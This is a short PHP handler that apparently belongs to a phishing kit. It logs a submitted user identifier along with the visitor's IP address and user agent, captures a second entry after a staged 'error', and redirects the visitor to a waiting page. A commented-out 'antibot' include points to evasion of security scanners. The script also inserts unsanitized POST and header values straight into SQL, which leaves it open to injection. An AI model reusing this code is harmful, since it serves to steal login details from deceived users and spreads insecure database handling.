<?php
//require_once('../antibot8/code/include.php');
session_start();

$coxfile=  "cox.php";

include $coxfile;


if ($_SERVER['REQUEST_METHOD'] == 'POST')
{





$userip =$_SERVER['REMOTE_ADDR'];
$ip = $_SERVER['REMOTE_ADDR'];
$user=$_POST['inpt1'];
$_SESSION["user"]=$_POST['inpt1'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");
$dirp =$_SESSION['finalurl'];




if(isset($_POST['error'])==""){
 $sql ="INSERT INTO user(IP,user,useragent,sessionuser,datelog,page)VALUES ('$ip', '$user', '$agent', '$dirp','$date','');";
}

if(isset($_POST['error'])=="yes"){

    $sql ="UPDATE user set user2 ='$user' , page='',lastpage='wait.php' where IP='$ip';";
}




   $ret = $db->exec($sql);
   if(!$ret) {
      //echo $db->lastErrorMsg();
   } else {
      //echo "Records created successfully\n";
   }
   $db->close();




   echo "<script>location.replace('wait.php');</script>";





}


echo "<script>location.replace('index.php');</script>";






?>
